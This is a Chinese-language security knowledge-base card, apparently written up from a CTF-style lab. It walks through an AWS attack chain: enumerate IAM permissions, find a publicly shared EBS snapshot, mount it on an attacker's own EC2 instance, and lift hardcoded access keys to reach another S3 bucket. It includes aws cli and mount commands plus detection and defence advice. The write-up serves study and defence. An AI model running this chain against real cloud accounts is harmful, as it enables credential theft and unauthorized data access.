---
id: cloud-public-ebs-snapshot-volume-mount-credential-loot
title: 公开 EBS 快照（createVolumePermission=all）→ 创建卷挂载 EC2 → 文件系统挖硬编码 AK/SK
type: scenario
domain: cloud
path: cloud
technique: public-ebs-snapshot-volume-mount-credential-loot
tags:
- cloud
- aws
- ebs
- snapshot
- ec2
- iam
- credential
- volume-mount
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-11
  verified_at: '2026-11-08T07:08:31+08:00'
  notes: 已对照原文核对：策略 PublicSnapper(DescribeSnapshots/DescribeSnapshotAttribute/ebs:GetSnapshotBlock)、createVolumePermission=Group all、us-east-1a 建卷、/dev/xvdb1 挂载、s3_download_file.php 硬编码 AK/SK 后读 flag，均与 12-25 图一致；与 EFS 挂载卡(16404)同为 related 但对象/机制不同，不合并；无版本字段。
url: /docs/cloud/cloud-public-ebs-snapshot-volume-mount-credential-loot/
draft: false
kb_aliases:
- 公开 EBS 快照
- createVolumePermission Group all
- 从快照复制卷
- 挂载 /dev/xvdb1
- s3_download_file.php 硬编码 AK/SK
- IAM 策略自查
---

## 一句话结论

当低权限 AWS 凭据（如 intern 用户）只被授予查看快照的权限时，可自查 IAM 策略找到 `ec2:DescribeSnapshots` / `ec2:DescribeSnapshotAttribute`，列出账号下的 EBS 快照并检查 `createVolumePermission`；若某快照对 `{"Group":"all"}` 公开，任何账号都能从它创建 EBS 卷，挂到自建同可用区 EC2 上读取文件系统，从中挖出硬编码 AK/SK、配置文件等敏感数据，横向到其他云资源。

## 原理

- 拿到 AK/SK 后先做权限自查：`aws sts get-caller-identity`（whoami）→ `iam list-attached-user-policies` → `iam get-policy` / `get-policy-version` 读出具体 Action/Resource，判断凭据价值（本文策略 PublicSnapper 允许 DescribeSnapshotAttribute（特定快照）、DescribeSnapshots（全部快照）、ebs:ListSnapshotBlocks/GetSnapshotBlock 及少量 IAM 读权限）。
- `createVolumePermission` 属性决定「谁可以用该快照创建 EBS 卷」；返回 `{"Group":"all"}` 表示快照公开，任何 AWS 账户都能 `CreateVolume` 从快照还原出一块含原始文件系统的块设备。
- EBS 卷只能在**同一可用区(AZ)** 挂载到 EC2，因此创建卷时记录的 AZ 必须与新建实例的子网 AZ 一致；EC2 默认禁止 root 直接登录（提示用 `ec2-user`），登录后 `lsblk` 找到新块设备（如 `xvdb`/`xvdb1`），`mount /dev/xvdb1 <挂载点>` 即可浏览快照里的目录。
- 快照里往往残留业务文件与凭据：本文在 `/home/intern/practice_files/s3_download_file.php` 找到硬编码的 `BUCKET_NAME`、`IAM_KEY`、`IAM_SECRET`，配置到 aws cli 后即可访问另一个 S3 桶（含 flag.txt），形成「低权凭据 → 公开快照 → 高权凭据 → 数据」的横向链。
- 关键根因是快照共享范围配置错误 + 主机文件系统里长期存放明文长期密钥。

## 触发条件

- 持有一组低权 AK/SK，且策略允许 `ec2:DescribeSnapshots` / `DescribeSnapshotAttribute`（或 `ebs:ListSnapshotBlocks`）。
- 目标账号存在 `createVolumePermission` 为 `all` 的公开 EBS 快照。
- 攻击者有自有 AWS 账号，可在同 AZ 创建 EC2 与卷并 SSH 登录。

## 利用步骤

1. `aws configure` 配置给定 AK/SK；`aws sts get-caller-identity` 确认身份。
2. `iam list-attached-user-policies --user-name <user>` → `iam get-policy-version` 读出策略权限，确认可查快照。
3. `aws ec2 describe-snapshots --owner-ids self --region <region>` 列出快照 ID。
4. `aws ec2 describe-snapshot-attribute --snapshot-id <snap> --attribute createVolumePermission` 确认 `{"Group":"all"}`。
5. 控制台从该快照「复制/创建卷」，记录可用区；在**同 AZ** 创建免费套餐 EC2 并建密钥对。
6. 用 `ec2-user` SSH 登录，把卷附加到实例（如 `/dev/sdb`），`lsblk` 确认设备，`mount /dev/xvdb1 /mnt/loot`。
7. 遍历文件系统找 `.php`、配置、`.aws/credentials`、`export.xml` 等，提取硬编码 AK/SK，配置后访问关联资源。

## PoC

```text
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id <vN>
aws ec2 describe-snapshots --owner-ids self --region <region>
aws ec2 describe-snapshot-attribute --snapshot-id <snap> --attribute createVolumePermission
# -> {"CreateVolumePermissions":[{"Group":"all"}]}
# 控制台：从快照创建卷（记 AZ）→ 同 AZ 建 EC2 → 附加卷 → SSH(ec2-user)
lsblk                       # xvdb / xvdb1
mount /dev/xvdb1 /mnt/loot
cat /mnt/loot/home/intern/practice_files/s3_download_file.php   # 含 BUCKET_NAME / IAM_KEY / IAM_SECRET
aws s3 ls s3://<leaked-bucket>   # 横向读 flag.txt
```

（最小化示意，快照 ID/桶名/密钥为占位，未执行任何 PoC。）

## 变体与关联

- 变体：无控制台时可用 `ebs:ListSnapshotBlocks`/`GetSnapshotBlock` 直接按块读取快照数据；也可从公开 AMI/共享快照入手，思路相同。
- 关联：前置可接「从公开 S3 桶枚举 AWS Account ID」拿到账号 ID 后按 owner 查快照（本批另有对应卡）；后续可接「S3 匿名枚举 + 凭据提权」。
- 关联：与「IAM 工作负载凭据策略自助枚举/危险权限判定」卡互补——本卡把「DescribeSnapshots 只读权限」升级为「读他人主机文件系统」。
- 边界：危害是读取快照内残留的凭据/数据，不含对原账号的直接控制。

## 检测与防御

- 检测：CloudTrail 监控 `DescribeSnapshotAttribute`、`CreateVolume`（尤其跨账号从公共快照）、`AttachVolume` 与异常 EC2 创建；审计哪些快照 `createVolumePermission=all`。
- 防御：禁止将 EBS 快照设为 public，仅按明确账号 ID 共享；加密敏感快照并保护 KMS 密钥；主机内不存放长期 AK/SK，改用角色/临时凭证与 Secrets Manager；启用 EBS 加密默认与 IAM 最小权限。
